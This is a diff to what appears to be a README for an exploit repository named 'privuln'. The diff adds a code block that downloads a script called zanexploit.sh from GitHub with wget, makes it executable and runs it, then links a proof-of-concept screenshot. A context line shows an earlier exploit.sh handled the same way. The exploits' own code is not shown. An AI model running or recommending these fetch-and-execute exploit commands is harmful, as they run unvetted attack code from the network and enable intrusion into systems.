@@ -24,3 +24,12 @@ chmod +x exploit.sh
 ```
 ### Proof of Concept
 <img src="https://raw.githubusercontent.com/1337r0j4n/privuln/main/molla-exploit-poc.png">
+
+
+```
+wget https://raw.githubusercontent.com/1337r0j4n/privuln/main/zanexploit.sh
+chmod +x zanexploit.sh
+./zanexploit.sh
+```
+### Proof of Concept
+<img src="https://raw.githubusercontent.com/1337r0j4n/privuln/main/zanexploit-poc.png">
